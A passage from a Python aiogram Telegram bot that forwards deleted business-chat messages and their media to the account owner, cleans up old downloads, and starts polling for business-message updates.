                has_local = local_path and os.path.exists(local_path)
                media_input = FSInputFile(local_path) if has_local else file_id

                if media_type == "photo":
                    await event.bot.send_photo(chat_id=owner_id, photo=media_input, caption=caption_media, parse_mode="HTML")
                elif media_type == "animation":
                    await event.bot.send_animation(chat_id=owner_id, animation=media_input, caption=caption_media, parse_mode="HTML")
                elif media_type == "voice":
                    await event.bot.send_voice(chat_id=owner_id, voice=media_input, caption=caption_media, parse_mode="HTML")
                elif media_type == "video":
                    await event.bot.send_video(chat_id=owner_id, video=media_input, caption=caption_media, parse_mode="HTML")
                elif media_type == "document":
                    await event.bot.send_document(chat_id=owner_id, document=media_input, caption=caption_media, parse_mode="HTML")
                elif media_type == "audio":
                    await event.bot.send_audio(chat_id=owner_id, audio=media_input, caption=caption_media, parse_mode="HTML")
                elif media_type == "sticker":
                   
                    report = caption + "\n🎯 <b>[Стикер]</b>:"
                    await event.bot.send_message(chat_id=owner_id, text=report, parse_mode="HTML")
                    await event.bot.send_sticker(chat_id=owner_id, sticker=media_input)
                elif media_type == "video_note":
                   
                    report = caption + "\n🎬 <b>[Круглое видеосообщение]</b>:"
                    await event.bot.send_message(chat_id=owner_id, text=report, parse_mode="HTML")
                    await event.bot.send_video_note(chat_id=owner_id, video_note=media_input)
                else:
                  
                    await event.bot.send_document(chat_id=owner_id, document=media_input, caption=caption_media, parse_mode="HTML")

                if has_local:
                    try:
                        os.remove(local_path)
                        await update_message_local_path(chat_id, msg_id, None)
                    except Exception as e:
                        logger.error(f"Error deleting file after delete-handler: {e}")

        except Exception as e:
            logger.error(f"Error forwarding deleted message {msg_id} to owner {owner_id}: {e}")
def cleanup_old_downloads(directory="downloads", max_age_seconds=86400):
    """Deletes files in directory that are older than max_age_seconds."""
    if not os.path.exists(directory):
        return
    now = time.time()
    count = 0
    for filename in os.listdir(directory):
        filepath = os.path.join(directory, filename)
        if os.path.isfile(filepath):
            file_age = now - os.path.getmtime(filepath)
            if file_age > max_age_seconds:
                try:
                    os.remove(filepath)
                    count += 1
                except Exception as e:
                    logger.error(f"Error deleting old file {filepath}: {e}")
    if count > 0:
        logger.info(f"Cleaned up {count} old download files.")



async def main():
    logger.info("Starting bot initialization...")
    cleanup_old_downloads()
    await init_db()

    bot = Bot(token=BOT_TOKEN)
    dp = Dispatcher(storage=MemoryStorage())
    dp.include_router(router)

    # Set bot commands in Telegram menu
    await bot.set_my_commands([
        BotCommand(command="start", description="🔄 Перезапустить бота"),
        BotCommand(command="settings", description="⚙️ Настройки"),
        BotCommand(command="cmd", description="💻 Описание команд"),
        BotCommand(command="chat", description="♻️ Чаты"),
        BotCommand(command="commands", description="📜 Список всех команд")
    ])


    logger.info("Bot is starting polling...")
    
   
    allowed_updates = [
        "message",
        "edited_message",
        "business_connection",
        "business_message",
        "edited_business_message",
        "deleted_business_messages"
    ]
    
    try:
        await dp.start_polling(bot, allowed_updates=allowed_updates)
    finally:
        await bot.session.close()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except (KeyboardInterrupt, SystemExit):
        logger.info("Bot stopped.")
